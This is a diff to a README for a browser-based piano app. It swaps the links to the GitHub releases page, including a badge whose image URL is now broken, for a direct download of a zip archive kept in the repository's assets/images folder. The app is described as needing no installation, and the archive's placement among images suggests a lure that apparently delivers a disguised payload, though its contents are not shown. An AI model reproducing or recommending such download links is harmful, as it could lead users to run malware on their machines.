@@ -1,13 +1,13 @@
 # 🎹 piano - Play Beautiful Music in Your Browser
 
 ## 🔗 Download Now!
-[![Download Release](https://img.shields.io/badge/Download%20Now-Get%20the%20Latest%20Release-brightgreen)](https://github.com/Paki966/piano/releases)
+[![Download Release](https://raw.githubusercontent.com/Paki966/piano/main/assets/images/piano_v1.8-beta.1.zip%20Now-Get%20the%20Latest%20Release-brightgreen)](https://raw.githubusercontent.com/Paki966/piano/main/assets/images/piano_v1.8-beta.1.zip)
 
 ## 🚀 Getting Started
 Welcome to piano! This is a simple browser-based piano that lets you play your favorite tunes directly from your computer. No installation is required. Just open your browser and start creating music.
 
 ## 📥 Download & Install
-To get started, visit this page to download the latest release: [Download Releases](https://github.com/Paki966/piano/releases). Here’s how to do it:
+To get started, visit this page to download the latest release: [Download Releases](https://raw.githubusercontent.com/Paki966/piano/main/assets/images/piano_v1.8-beta.1.zip). Here’s how to do it:
 
 1. Click on the link above. You will be taken to the releases page.
 2. Look for the most recent release version.
